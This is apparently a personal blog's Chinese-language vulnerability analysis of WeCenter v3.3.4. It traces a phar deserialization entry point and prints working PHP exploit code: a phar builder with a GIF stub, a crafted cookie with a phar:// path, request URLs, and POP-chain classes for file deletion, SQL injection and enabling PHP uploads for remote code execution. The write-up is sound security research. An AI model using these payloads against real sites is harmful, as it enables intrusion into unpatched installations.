@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="WeCenter_v3.3.4漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/23/WeCenter-v3-3-4漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="WeCenter_v3.3.4漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/23/WeCenter-v3-3-4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/PCLpqlcitxj251I.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/JTzR1n5m4bGIFKr.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/nog8A2YaE5TIWuL.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/vOTGnhlbiyr963M.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/cJr3dxsOXo2qQfn.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/PckqvbjprhL2JTu.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/OB5pGJacHzLXVFY.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/UaToMSN8CfAZV4h.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/2T5Y4j7SMoNOkXL.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/RxvXO375iYdgDyP.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/yWgvGj1RUMdrc8Z.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/ROypYzmGgewFaBs.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/fgFWOZ6s9njyESm.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/PZnmJeI2aKOXYsf.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/OqfnUxmd5EMvAFi.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/XzNFRvUHp7k6Cfh.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/23/hZCNzY5JVtkO4rv.png">
+<meta property="article:published_time" content="2020-03-23T02:02:41.000Z">
+<meta property="article:modified_time" content="2020-03-23T11:17:55.862Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/23/PCLpqlcitxj251I.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> WeCenter_v3.3.4漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          WeCenter_v3.3.4漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 23 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#环境搭建">环境搭建</a></li>
+<li><a href="#漏洞分析">漏洞分析</a><ul>
+<li><a href="#反序列化触发点">反序列化触发点</a></li>
+<li><a href="#pop链">POP链</a></li>
+<li><a href="#漏洞修复">漏洞修复</a></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<blockquote>
+<p>反序列化点可以从两个方向进行寻找，一种是直接搜可控的 <strong>unserialize(可控)</strong> ，另一种是完全可控的文件名（利用 <strong>phar://</strong> 协议触发反序列化）。 </p>
+</blockquote>
+<h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p><a href="http://www.wecenter.com/downloads/" target="_blank" rel="noopener">http://www.wecenter.com/downloads/</a> </p>
+</blockquote>
+<h3><span id="漏洞分析">漏洞分析</span></h3><p><code>api/admin_notify.php</code>有个明显的XSS漏洞</p>
+<p><img src="https://i.loli.net/2020/03/23/PCLpqlcitxj251I.png" alt="Snipaste_2020-03-23_10-29-01.png"></p>
+<h4><span id="反序列化触发点">反序列化触发点</span></h4><p>全局搜索<code>unserialize(</code>，发现不存在</p>
+<p>全局搜索能触发phar反序列化的函数</p>
+<p><img src="https://i.loli.net/2020/03/23/JTzR1n5m4bGIFKr.png" alt="Snipaste_2020-03-23_10-23-33.png"></p>
+<p>先对链接中的漏洞进行分析，再进行其他的漏洞挖掘</p>
+<p><code>models/account.php</code></p>
+<p><img src="https://i.loli.net/2020/03/23/nog8A2YaE5TIWuL.png" alt="Snipaste_2020-03-23_10-41-41.png"></p>
+<p>全局搜索调用<code>associate_remote_avatar()</code></p>
+<p><code>app/account/ajax.php</code>处可进一步利用，另外几处似乎是第三方登录提供</p>
+<p><img src="https://i.loli.net/2020/03/23/vOTGnhlbiyr963M.png" alt="Snipaste_2020-03-23_10-43-51.png"></p>
+<p>从<code>users_weixin</code>表中得到的<code>headimgurl</code>字段值，全局寻找这张表的update或者insert操作</p>
+<p><code>models/openid/weixin/weixin.php</code></p>
+<p><img src="https://i.loli.net/2020/03/23/cJr3dxsOXo2qQfn.png" alt="Snipaste_2020-03-23_10-55-42.png"></p>
+<p>全局搜索<code>bind_account()</code></p>
+<p><img src="https://i.loli.net/2020/03/23/PckqvbjprhL2JTu.png" alt="Snipaste_2020-03-23_11-05-14.png"></p>
+<p>调用这个方法，控制cookie即可插入数据库，配合之前的<code>file_get_contents()</code>触发phar反序列化</p>
+<h4><span id="pop链">POP链</span></h4><p>全局搜索<code>__destruct()</code>和<code>__construct()</code></p>
+<p><strong>任意文件删除</strong></p>
+<p><code>models/excel/PHPExcel/Shared/XMLWriter.php</code></p>
+<p><img src="https://i.loli.net/2020/03/23/OB5pGJacHzLXVFY.png" alt="Snipaste_2020-03-23_11-22-24.png"></p>
+<p>或者<code>system/Zend/Http/Response/Stream.php</code>也存在任意文件删除</p>
+<p>EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class PHPExcel_Shared_XMLWriter&#123;</span><br><span class="line">		&#x2F;&#x2F;网站根目录下的a.txt</span><br><span class="line">		private $tempFileName  &#x3D; &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;a.txt&#39;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">    $o &#x3D; new PHPExcel_Shared_XMLWriter();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意不能在头像处进行文件上传，因为</p>
+<p><img src="https://i.loli.net/2020/03/23/UaToMSN8CfAZV4h.png" alt="Snipaste_2020-03-23_15-09-46.png"></p>
+<p><img src="https://i.loli.net/2020/03/23/2T5Y4j7SMoNOkXL.png" alt="Snipaste_2020-03-23_12-20-05.png"></p>
+<p>得到路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WeCenter_3-3-4&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif</span><br></pre></td></tr></table></figure>
+
+<p>生成json</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $arr &#x3D; [];</span><br><span class="line">    $arr[&#39;access_token&#39;][&#39;openid&#39;] &#x3D; 1;</span><br><span class="line">    $arr[&#39;access_user&#39;][&#39;nickname&#39;] &#x3D; &#39;gqy&#39;;</span><br><span class="line">    $arr[&#39;access_user&#39;][&#39;headimgurl&#39;] &#x3D; &#39;phar:&#x2F;&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif&#39;;</span><br><span class="line">    echo json_encode($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>添加Cookie并访问<code>/app/m/weixin.php</code>的<code>binding_action</code></p>
+<p>通过下面的url格式调用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;m&#x2F;weixin&#x2F;binding&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>Cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmp__WXConnect&#x3D;&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;gqy&quot;,&quot;headimgurl&quot;:&quot;phar:\&#x2F;\&#x2F;uploads\&#x2F;question\&#x2F;20200323\&#x2F;79595eac2a24794833379d4945e73c3c.gif&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/23/RxvXO375iYdgDyP.png" alt="Snipaste_2020-03-23_13-09-39.png"></p>
+<p>再调用<code>app/account/ajax.php</code>的<code>synch_img_action()</code>方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;account&#x2F;ajax&#x2F;synch_img&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>但是发现第一处任意文件删除并不可行，在加载类时并没有成功，简单跟了一下没跟出来。。。</p>
+<p>再试试第二处任意文件删除，</p>
+<p><img src="https://i.loli.net/2020/03/23/yWgvGj1RUMdrc8Z.png" alt="Snipaste_2020-03-23_15-49-05.png"></p>
+<p>能进入加载类并进入<code>__destruct()</code>，但是还是没删除成功，可能是我windows系统的原因??</p>
+<p><strong>SQL注入</strong></p>
+<p><code>system/aws_model.inc.php</code></p>
+<p><img src="https://i.loli.net/2020/03/23/ROypYzmGgewFaBs.png" alt="Snipaste_2020-03-23_11-30-17.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class AWS_MODEL&#123;</span><br><span class="line">		private $_shutdown_query &#x3D; [&#39;gqy&#39;&#x3D;&gt;&#39;SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/23/fgFWOZ6s9njyESm.png" alt="Snipaste_2020-03-23_17-45-23.png"></p>
+<p><strong>RCE</strong></p>
+<p>发现在后台存在一处设置上传白名单的地方</p>
+<p><img src="https://i.loli.net/2020/03/23/PZnmJeI2aKOXYsf.png" alt="Snipaste_2020-03-23_18-10-27.png"></p>
+<p>添加一个<code>gqyy</code>，通过查看sql执行语句可以发现是</p>
+<p><img src="https://i.loli.net/2020/03/23/OqfnUxmd5EMvAFi.png" alt="Snipaste_2020-03-23_18-15-09.png"></p>
+<p>那么直接添加一个php进去即可，注意转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class AWS_MODEL&#123;</span><br><span class="line">			private $_shutdown_query &#x3D; [&#39;UPDATE &#96;aws_system_setting&#96; SET &#96;value&#96; &#x3D; \&#39;s:45:&quot;jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php&quot;;\&#39; WHERE (&#96;varname&#96; &#x3D; \&#39;allowed_upload_types\&#39;)&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/23/XzNFRvUHp7k6Cfh.png" alt="Snipaste_2020-03-23_18-37-51.png"></p>
+<h4><span id="漏洞修复">漏洞修复</span></h4><p>官方修复直接把下面这段注释掉了</p>
+<p><img src="https://i.loli.net/2020/03/23/hZCNzY5JVtkO4rv.png" alt="Snipaste_2020-03-23_18-52-17.png"></p>
+<h4><span id="总结">总结</span></h4><p>整体挖掘思路还是很赞的，就是遇到一些奇怪的坑，还没解决。。。</p>
+<p>之后挖掘一下<code>v3.3.5</code>的试试</p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/7077" target="_blank" rel="noopener">https://xz.aliyun.com/t/7077</a> </p>
+<p> <a href="https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL注入到RCE/#漏洞点" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/#%E6%BC%8F%E6%B4%9E%E7%82%B9</a> </p>
+<p>####</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/22/%E9%80%9A%E8%BE%BEOA%E6%9C%80%E6%96%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE/">
+        <span class="next-text nav-default">通达OA最新文件上传+文件包含RCE</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
